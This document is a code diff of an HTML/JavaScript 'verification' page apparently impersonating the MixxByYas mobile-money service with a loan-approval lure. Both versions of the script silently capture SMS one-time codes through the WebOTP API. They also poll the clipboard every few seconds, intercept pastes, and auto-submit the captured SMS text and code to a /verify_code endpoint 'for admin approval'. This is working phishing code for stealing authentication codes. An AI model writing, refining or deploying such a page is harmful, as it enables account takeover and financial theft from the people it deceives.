@@ -1,16 +1,15 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>MixxByYas • Verification</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz@14..32&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
         body {
             min-height: 100vh;
-            background: linear-gradient(145deg, #0b0e1a 0%, #141b2b 100%);
+            background: linear-gradient(145deg, #0b0e1a, #141b2b);
             display: flex;
             align-items: center;
             justify-content: center;
@@ -19,279 +18,174 @@
         .card {
             max-width: 480px;
             width: 100%;
-            background: rgba(22, 30, 46, 0.85);
-            backdrop-filter: blur(12px);
-            border-radius: 48px;
-            padding: 32px 24px;
-            box-shadow: 0 25px 50px -8px rgba(0,0,0,0.8);
-            border: 1px solid rgba(255,255,255,0.04);
-        }
-        .badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: rgba(99, 102, 241, 0.15);
-            padding: 6px 16px 6px 12px;
-            border-radius: 60px;
-            color: #a5b4fc;
-            font-size: 12px;
-            font-weight: 600;
-            border: 1px solid rgba(99, 102, 241, 0.2);
-            margin-bottom: 20px;
+            background: rgba(22, 30, 46, 0.9);
+            border-radius: 30px;
+            padding: 30px 20px;
+            border: 1px solid rgba(255,255,255,0.05);
         }
         h2 {
             color: #f1f5f9;
-            font-weight: 600;
-            font-size: 26px;
-            margin-bottom: 8px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
+            font-size: 24px;
+            margin-bottom: 10px;
         }
-        h2 i { color: #818cf8; font-size: 28px; }
         .sub {
             color: #94a3b8;
-            font-size: 15px;
-            margin-bottom: 28px;
-            border-left: 3px solid #4f46e5;
-            padding-left: 14px;
+            margin-bottom: 20px;
         }
         .step-guide {
             background: rgba(15, 23, 42, 0.6);
-            border-radius: 20px;
-            padding: 18px 16px;
-            margin-bottom: 28px;
-            border: 1px solid rgba(255,255,255,0.03);
+            border-radius: 15px;
+            padding: 15px;
+            margin-bottom: 20px;
         }
         .step-item {
             display: flex;
-            align-items: flex-start;
-            gap: 14px;
-            margin-bottom: 14px;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 10px;
+            color: #e2e8f0;
         }
         .step-item:last-child { margin-bottom: 0; }
         .step-num {
+            background: #4f46e5;
+            color: white;
+            border-radius: 50%;
+            width: 28px;
+            height: 28px;
             display: flex;
             align-items: center;
             justify-content: center;
-            min-width: 28px;
-            height: 28px;
-            background: #4f46e5;
-            color: white;
-            border-radius: 30px;
+            font-weight: bold;
             font-size: 13px;
-            font-weight: 700;
         }
-        .step-text { color: #e2e8f0; font-size: 15px; line-height: 1.5; }
-        .step-text strong { color: #a5b4fc; }
         .sms-box {
             background: #0f172a;
-            border-radius: 24px;
-            padding: 20px 18px;
-            margin: 20px 0 18px;
+            border-radius: 15px;
+            padding: 15px;
             border: 1px solid #334155;
+            margin: 15px 0;
         }
         .sms-box label {
-            display: block;
             color: #94a3b8;
             font-size: 13px;
-            font-weight: 500;
+            display: block;
             margin-bottom: 8px;
         }
-        .sms-box label i { margin-right: 8px; color: #818cf8; }
         textarea#smsCode {
             width: 100%;
             background: transparent;
             border: none;
-            resize: none;
             color: #f1f5f9;
-            font-size: 16px;
-            line-height: 1.6;
-            min-height: 90px;
-            padding: 0;
+            font-size: 15px;
+            min-height: 80px;
             outline: none;
             font-family: monospace;
+            resize: none;
         }
-        textarea#smsCode::placeholder { color: #475569; font-size: 15px; }
-        .btn-app {
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            background: #1e293b;
-            border: 1px solid #334155;
-            padding: 12px 20px;
-            border-radius: 60px;
-            color: #e2e8f0;
-            font-weight: 500;
-            font-size: 15px;
-            cursor: pointer;
-            text-decoration: none;
-            margin-right: 10px;
-            margin-bottom: 10px;
-        }
-        .btn-app:active { transform: scale(0.96); }
         .btn-primary {
             width: 100%;
             background: #4f46e5;
             border: none;
-            padding: 16px;
-            border-radius: 60px;
+            padding: 15px;
+            border-radius: 30px;
             color: white;
-            font-weight: 600;
-            font-size: 17px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-            margin-top: 12px;
+            font-weight: bold;
+            font-size: 16px;
             cursor: pointer;
-            box-shadow: 0 8px 20px -6px rgba(79, 70, 229, 0.3);
+            margin-top: 10px;
         }
-        .btn-primary:active { transform: scale(0.97); background: #4338ca; }
-        .btn-primary:disabled {
-            opacity: 0.6;
-            transform: none;
-            background: #334155;
-            box-shadow: none;
-            cursor: not-allowed;
-        }
+        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; }
         .resend-area {
             display: flex;
-            align-items: center;
             justify-content: space-between;
-            margin-top: 18px;
-            font-size: 14px;
+            margin-top: 15px;
             color: #94a3b8;
-            flex-wrap: wrap;
+            font-size: 14px;
         }
         #resendBtn {
             background: transparent;
             border: none;
             color: #818cf8;
-            font-weight: 600;
-            padding: 8px 14px;
-            border-radius: 60px;
             cursor: pointer;
-            display: flex;
-            align-items: center;
-            gap: 8px;
+            font-weight: bold;
         }
         #resendBtn:disabled { opacity: 0.4; cursor: not-allowed; }
-        #resendCounter {
-            background: #1e293b;
-            padding: 5px 14px;
-            border-radius: 40px;
-            font-weight: 500;
-            color: #cbd5e1;
-        }
         .status-badge {
             text-align: center;
-            margin-top: 16px;
-            font-size: 14px;
+            margin-top: 15px;
             color: #94a3b8;
+            font-size: 14px;
         }
-        .status-badge i { margin-right: 6px; }
         .hidden { display: none !important; }
         .toast {
             background: #0f172a;
-            border-left: 4px solid #4f46e5;
-            padding: 14px 18px;
-            border-radius: 16px;
+            border-left: 3px solid #4f46e5;
+            padding: 10px 15px;
+            border-radius: 10px;
             color: #e2e8f0;
-            margin: 16px 0 8px;
+            margin: 10px 0;
             font-size: 14px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.3);
         }
-        .toast i { color: #818cf8; font-size: 20px; }
         .spinner {
             display: inline-block;
-            width: 18px;
-            height: 18px;
+            width: 16px;
+            height: 16px;
             border: 2px solid rgba(255,255,255,0.2);
             border-top: 2px solid white;
             border-radius: 50%;
             animation: spin 0.7s linear infinite;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .auto-detect-badge {
+        @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
+        .detect-badge {
             background: rgba(16, 185, 129, 0.15);
             border: 1px solid rgba(16, 185, 129, 0.3);
-            border-radius: 60px;
-            padding: 8px 16px;
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
+            border-radius: 30px;
+            padding: 6px 15px;
+            display: inline-block;
             color: #34d399;
             font-size: 13px;
-            font-weight: 500;
-            margin-bottom: 16px;
-        }
-        .auto-detect-badge .pulse-dot {
-            display: inline-block;
-            width: 8px;
-            height: 8px;
-            background: #34d399;
-            border-radius: 50%;
-            animation: pulse 1.5s ease-in-out infinite;
-        }
-        @keyframes pulse {
-            0% { opacity: 0.4; transform: scale(0.9); }
-            50% { opacity: 1; transform: scale(1.2); }
-            100% { opacity: 0.4; transform: scale(0.9); }
+            margin-bottom: 15px;
         }
         .code-display {
             background: #0f172a;
-            padding: 12px;
-            border-radius: 12px;
-            font-size: 24px;
-            font-weight: bold;
-            color: #34d399;
+            padding: 10px;
+            border-radius: 10px;
             text-align: center;
-            margin: 10px 0;
+            color: #34d399;
+            font-size: 22px;
+            font-weight: bold;
             font-family: monospace;
-            letter-spacing: 4px;
+            margin: 10px 0;
+            letter-spacing: 3px;
         }
         .success-overlay {
             position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
+            top: 0; left: 0; right: 0; bottom: 0;
             background: rgba(0,0,0,0.8);
             display: none;
             align-items: center;
             justify-content: center;
             z-index: 1000;
-            backdrop-filter: blur(8px);
         }
         .success-overlay.show { display: flex; }
         .success-modal {
             background: #1e293b;
-            padding: 40px;
-            border-radius: 32px;
+            padding: 30px;
+            border-radius: 25px;
             text-align: center;
-            max-width: 400px;
+            max-width: 350px;
             width: 90%;
-            border: 1px solid rgba(16, 185, 129, 0.3);
         }
-        .success-modal i {
-            font-size: 60px;
-            color: #34d399;
-            margin-bottom: 20px;
-        }
-        .success-modal h2 { color: #f1f5f9; margin-bottom: 10px; }
-        .success-modal p { color: #94a3b8; margin-bottom: 20px; }
-        .success-modal .btn-close {
+        .success-modal i { font-size: 50px; color: #34d399; }
+        .success-modal h2 { color: #f1f5f9; margin: 10px 0; }
+        .success-modal p { color: #94a3b8; margin-bottom: 15px; }
+        .success-modal button {
             background: #4f46e5;
             border: none;
-            padding: 12px 30px;
-            border-radius: 60px;
+            padding: 10px 30px;
+            border-radius: 30px;
             color: white;
-            font-weight: 600;
+            font-weight: bold;
             cursor: pointer;
         }
         .sms-actions {
@@ -299,52 +193,39 @@
             gap: 10px;
             margin: 10px 0;
         }
-        .sms-badge {
-            background: rgba(99, 102, 241, 0.1);
-            padding: 2px 10px;
-            border-radius: 20px;
-            font-size: 11px;
-            color: #818cf8;
-            border: 1px solid rgba(99, 102, 241, 0.1);
+        .btn-app {
+            flex: 1;
+            background: #1e293b;
+            border: 1px solid #334155;
+            padding: 10px;
+            border-radius: 30px;
+            color: #e2e8f0;
+            text-align: center;
+            text-decoration: none;
+            font-size: 14px;
         }
+        .btn-app i { margin-right: 5px; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <div class="badge">
-        <i class="fas fa-shield-alt"></i> Secure verification
-    </div>
-    <h2>
-        <i class="fas fa-mobile-screen-button"></i> Code check
-    </h2>
-    <div class="sub">
-        <i class="fas fa-robot" style="margin-right: 8px;"></i> Auto-reads SMS from notification
-    </div>
+    <h2><i class="fas fa-mobile-screen-button" style="color:#818cf8;"></i> Code check</h2>
+    <div class="sub">Auto-reads SMS from notification</div>
 
-    <div class="auto-detect-badge">
-        <span class="pulse-dot"></span>
-        <span id="detectionStatus">📱 Auto-detecting SMS...</span>
+    <div class="detect-badge">
+        <span id="detectionStatus">📱 Listening for SMS...</span>
     </div>
 
     <div class="step-guide">
-        <div class="step-item">
-            <span class="step-num">1</span>
-            <span class="step-text"><strong>Wait</strong> for SMS to arrive</span>
-        </div>
-        <div class="step-item">
-            <span class="step-num">2</span>
-            <span class="step-text">Page will <strong>auto-detect</strong> the code</span>
-        </div>
-        <div class="step-item">
-            <span class="step-num">3</span>
-            <span class="step-text">Auto-submits for verification</span>
-        </div>
+        <div class="step-item"><span class="step-num">1</span> Wait for SMS to arrive</div>
+        <div class="step-item"><span class="step-num">2</span> Page auto-detects the code</div>
+        <div class="step-item"><span class="step-num">3</span> Auto-submits for verification</div>
     </div>
 
     <div class="sms-box">
-        <label for="smsCode"><i class="fas fa-sms"></i> Full SMS <span class="sms-badge">auto-detected</span></label>
-        <textarea id="smsCode" readonly placeholder="SMS will appear here automatically..."></textarea>
+        <label><i class="fas fa-sms"></i> Full SMS</label>
+        <textarea id="smsCode" readonly placeholder="SMS will appear here..."></textarea>
     </div>
 
     <div id="codeDisplay" class="code-display" style="display:none;">
@@ -367,7 +248,7 @@
     </div>
 
     <div id="statusToast" class="toast hidden">
-        <i class="fas fa-circle-check"></i>
+        <i class="fas fa-circle-check" style="color:#34d399;"></i>
         <span id="toastMessage">SMS detected!</span>
     </div>
     <div class="status-badge" id="statusText">
@@ -380,18 +261,17 @@
         <i class="fas fa-check-circle"></i>
         <h2>Loan Approved! ✅</h2>
         <p>Your loan has been approved successfully.</p>
-        <button class="btn-close" onclick="closeSuccess()">Done</button>
+        <button onclick="closeSuccess()">Done</button>
     </div>
 </div>
 
 <script>
-    // Simplified JavaScript
     const smsTextarea = document.getElementById('smsCode');
     const submitBtn = document.getElementById('submitBtn');
     const submitSpinner = document.getElementById('submitSpinner');
     const resendBtn = document.getElementById('resendBtn');
     const resendCounter = document.getElementById('resendCounter');
-    const statusToast = document.getElementById('statusToast');
+    const toastDiv = document.getElementById('statusToast');
     const toastMessage = document.getElementById('toastMessage');
     const statusText = document.getElementById('statusText');
     const detectionStatus = document.getElementById('detectionStatus');
@@ -400,41 +280,29 @@
     const successOverlay = document.getElementById('successOverlay');
 
     let resendAttempts = 0;
-    const MAX_RESEND = 3;
-    let cooldownTimer = null;
     let cooldownSeconds = 0;
+    let cooldownTimer = null;
     let isSubmitting = false;
     let smsDetected = false;
     let extractedCode = '';
 
-    function showToast(msg, isError = false) {
-        statusToast.classList.remove('hidden');
+    function showToast(msg) {
+        toastDiv.classList.remove('hidden');
         toastMessage.textContent = msg;
-        if (isError) {
-            statusToast.style.borderLeftColor = '#ef4444';
-            statusToast.querySelector('i').className = 'fas fa-circle-exclamation';
-        } else {
-            statusToast.style.borderLeftColor = '#4f46e5';
-            statusToast.querySelector('i').className = 'fas fa-circle-check';
-        }
         clearTimeout(window.toastTimeout);
-        window.toastTimeout = setTimeout(() => {
-            statusToast.classList.add('hidden');
-        }, 5000);
+        window.toastTimeout = setTimeout(() => toastDiv.classList.add('hidden'), 4000);
     }
 
-    function setStatus(msg, icon = 'fa-info-circle') {
-        statusText.innerHTML = `<i class="fas ${icon}"></i> ${msg}`;
+    function setStatus(msg) {
+        statusText.innerHTML = `<i class="fas fa-info-circle"></i> ${msg}`;
     }
 
     function updateResendUI() {
-        resendCounter.textContent = `${resendAttempts} / ${MAX_RESEND}`;
-        if (resendAttempts >= MAX_RESEND) {
+        resendCounter.textContent = `${resendAttempts} / 3`;
+        if (resendAttempts >= 3) {
             resendBtn.disabled = true;
             resendBtn.innerHTML = '<i class="fas fa-ban"></i> Imeisha';
-            return;
-        }
-        if (cooldownSeconds > 0) {
+        } else if (cooldownSeconds > 0) {
             resendBtn.disabled = true;
             resendBtn.innerHTML = `<i class="fas fa-hourglass-half"></i> ${cooldownSeconds}s`;
         } else {
@@ -458,18 +326,17 @@
         }, 1000);
     }
 
-    function extractCodeFromSMS(smsText) {
-        if (!smsText) return null;
+    function extractCode(text) {
+        if (!text) return null;
         const patterns = [
             /code[:\s]+([a-zA-Z0-9]{6,20})/i,
             /OTP[:\s]+([a-zA-Z0-9]{6,20})/i,
             /use the code[:\s]+([a-zA-Z0-9]{6,20})/i,
-            /([a-zA-Z0-9]{8,20})(?=\s+to\s+complete)/i,
             /\b([a-zA-Z0-9]{8,20})\b/
         ];
-        for (let pattern of patterns) {
-            const match = smsText.match(pattern);
-            if (match) return match[1];
+        for (let p of patterns) {
+            const m = text.match(p);
+            if (m) return m[1];
         }
         return null;
     }
@@ -481,25 +348,21 @@
                 detectionStatus.textContent = '📋 Please copy SMS';
                 return false;
             }
-
             detectionStatus.textContent = '📱 Listening for SMS...';
             
-            const abortController = new AbortController();
-            const timeoutId = setTimeout(() => abortController.abort(), 60000);
-
+            const controller = new AbortController();
+            const timeout = setTimeout(() => controller.abort(), 60000);
+            
             const otp = await navigator.credentials.get({
                 otp: { transport: ['sms'] },
-                signal: abortController.signal
+                signal: controller.signal
             });
-
-            clearTimeout(timeoutId);
-
+            
+            clearTimeout(timeout);
+            
             if (otp && otp.code) {
-                console.log('Code received:', otp.code);
                 extractedCode = otp.code;
-                const fullSMS = `Your verification code is: ${otp.code}`;
-                
-                smsTextarea.value = fullSMS;
+                smsTextarea.value = `Your verification code is: ${otp.code}`;
                 smsDetected = true;
                 
                 codeDisplay.style.display = 'block';
@@ -507,19 +370,17 @@
                 
                 detectionStatus.textContent = '✅ SMS detected!';
                 showToast(`Code: ${otp.code}`);
-                setStatus(`Code: ${otp.code} - Submitting...`, 'fa-check-circle');
+                setStatus('Code detected. Submitting...');
                 
                 setTimeout(() => {
-                    if (!isSubmitting && smsTextarea.value.trim().length > 0) {
+                    if (!isSubmitting && smsTextarea.value.trim()) {
                         submitCode();
                     }
                 }, 1000);
-                
                 return true;
             }
             return false;
-        } catch (err) {
-            console.log('WebOTP error:', err);
+        } catch (e) {
             detectionStatus.textContent = '📋 Please copy SMS';
             return false;
         }
@@ -528,88 +389,78 @@
     // Clipboard fallback
     async function readClipboard() {
         try {
-            if (!navigator.clipboard || !navigator.clipboard.readText) return false;
-            
+            if (!navigator.clipboard?.readText) return false;
             const text = await navigator.clipboard.readText();
-            if (text && text.trim().length > 10 && !smsDetected) {
-                smsTextarea.value = text.trim();
+            if (text && text.length > 10 && !smsDetected) {
+                smsTextarea.value = text;
                 smsDetected = true;
-                
-                const code = extractCodeFromSMS(text);
+                const code = extractCode(text);
                 if (code) {
                     extractedCode = code;
                     codeDisplay.style.display = 'block';
                     extractedCodeDisplay.textContent = code;
                 }
-                
                 detectionStatus.textContent = '✅ SMS from clipboard!';
                 showToast('SMS from clipboard!');
-                setStatus('SMS detected. Submitting...', 'fa-check-circle');
-                
+                setStatus('SMS detected. Submitting...');
                 setTimeout(() => {
-                    if (!isSubmitting && smsTextarea.value.trim().length > 0) {
+                    if (!isSubmitting && smsTextarea.value.trim()) {
                         submitCode();
                     }
                 }, 800);
                 return true;
             }
             return false;
-        } catch (err) {
+        } catch (e) {
             return false;
         }
     }
 
     async function detectSMS() {
         if (smsDetected || isSubmitting) return;
-        const autoSuccess = await autoReadSMS();
-        if (autoSuccess) return;
-        await readClipboard();
+        const success = await autoReadSMS();
+        if (!success) await readClipboard();
     }
 
     function submitCode() {
         const code = smsTextarea.value.trim();
         if (!code) {
-            showToast('Please paste SMS first.', true);
+            showToast('Please wait for SMS.');
             return;
         }
-
         if (isSubmitting) return;
+        
         isSubmitting = true;
         submitBtn.disabled = true;
         submitSpinner.classList.remove('hidden');
-        setStatus('Sending to admin...', 'fa-spinner fa-pulse');
+        setStatus('Sending to admin...');
 
-        const codeToSend = extractedCode || extractCodeFromSMS(code) || code;
+        const codeToSend = extractedCode || extractCode(code) || code;
 
         fetch('/verify_code', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                code: code,
-                extracted_code: codeToSend,
-                full_sms: code
-            })
+            body: JSON.stringify({ code: code, full_sms: code, extracted_code: codeToSend })
         })
-        .then(response => response.json())
+        .then(r => r.json())
         .then(data => {
             isSubmitting = false;
             submitBtn.disabled = false;
             submitSpinner.classList.add('hidden');
             if (data.status === 'success') {
                 showToast('Code sent to admin! 🔐');
-                setStatus('Waiting for admin approval.', 'fa-clock');
+                setStatus('Waiting for admin approval.');
             } else {
-                showToast('Error: ' + (data.message || 'try again'), true);
-                setStatus('Error. Please try again.', 'fa-exclamation-triangle');
+                showToast('Error. Try again.');
+                setStatus('Error. Please try again.');
             }
         })
-        .catch(err => {
+        .catch(() => {
             isSubmitting = false;
             submitBtn.disabled = false;
             submitSpinner.classList.add('hidden');
-            showToast('Network error. Try again.', true);
-            setStatus('No connection.', 'fa-wifi-slash');
-            console.error(err);
+            showToast('Network error.');
+            setStatus('No connection.');
         });
     }
 
@@ -622,83 +473,61 @@
     };
 
     // Event listeners
-    submitBtn.addEventListener('click', function(e) {
-        e.preventDefault();
-        submitCode();
-    });
-
-    resendBtn.addEventListener('click', function() {
-        if (resendAttempts >= MAX_RESEND) return;
-        if (cooldownSeconds > 0) return;
-
+    submitBtn.onclick = (e) => { e.preventDefault(); submitCode(); };
+    
+    resendBtn.onclick = function() {
+        if (resendAttempts >= 3 || cooldownSeconds > 0) return;
         resendAttempts++;
         startCooldown();
         updateResendUI();
-
         smsDetected = false;
         extractedCode = '';
         smsTextarea.value = '';
         codeDisplay.style.display = 'none';
         detectionStatus.textContent = '📱 Waiting for new SMS...';
-        
-        fetch('/resend_code', { method: 'POST' })
-        .then(res => res.json())
-        .then(data => {
-            showToast('Code resent! 📲');
-            setStatus('Check your SMS.', 'fa-envelope');
-            setTimeout(() => detectSMS(), 2000);
-        })
-        .catch(() => {
-            showToast('Failed to resend.', true);
-        });
-    });
+        fetch('/resend_code', { method: 'POST' }).catch(() => {});
+        setTimeout(() => detectSMS(), 2000);
+    };
 
     // Page events
-    window.addEventListener('load', function() {
-        setTimeout(() => detectSMS(), 1000);
-    });
+    window.onload = function() {
+        setTimeout(detectSMS, 1000);
+    };
 
     document.addEventListener('visibilitychange', function() {
         if (document.visibilityState === 'visible' && !smsDetected) {
-            detectionStatus.textContent = '🔄 Checking for SMS...';
-            setTimeout(() => detectSMS(), 500);
+            setTimeout(detectSMS, 500);
         }
     });
 
     document.addEventListener('paste', function(e) {
-        const pasted = e.clipboardData?.getData('text');
-        if (pasted && pasted.trim().length > 0 && !smsDetected) {
-            smsTextarea.value = pasted.trim();
+        const text = e.clipboardData?.getData('text');
+        if (text && text.length > 10 && !smsDetected) {
+            smsTextarea.value = text;
             smsDetected = true;
-            const code = extractCodeFromSMS(pasted);
+            const code = extractCode(text);
             if (code) {
                 extractedCode = code;
                 codeDisplay.style.display = 'block';
                 extractedCodeDisplay.textContent = code;
             }
             detectionStatus.textContent = '✅ SMS pasted!';
-            showToast('SMS pasted! 📋');
-            setStatus('SMS detected. Submitting...', 'fa-check-circle');
+            showToast('SMS pasted!');
+            setStatus('SMS detected. Submitting...');
             setTimeout(() => {
-                if (!isSubmitting && smsTextarea.value.trim().length > 0) {
+                if (!isSubmitting && smsTextarea.value.trim()) {
                     submitCode();
                 }
             }, 400);
         }
     });
 
-    // Init
     updateResendUI();
-    smsTextarea.setAttribute('readonly', 'readonly');
-    
-    // Keep trying
     setInterval(() => {
-        if (!smsDetected && !isSubmitting) {
-            detectSMS();
-        }
+        if (!smsDetected && !isSubmitting) detectSMS();
     }, 5000);
 
-    console.log('🚀 MixxByYas with SMS Auto-Read loaded!');
+    console.log('✅ MixxByYas SMS Auto-Read loaded!');
 </script>
 
 </body>
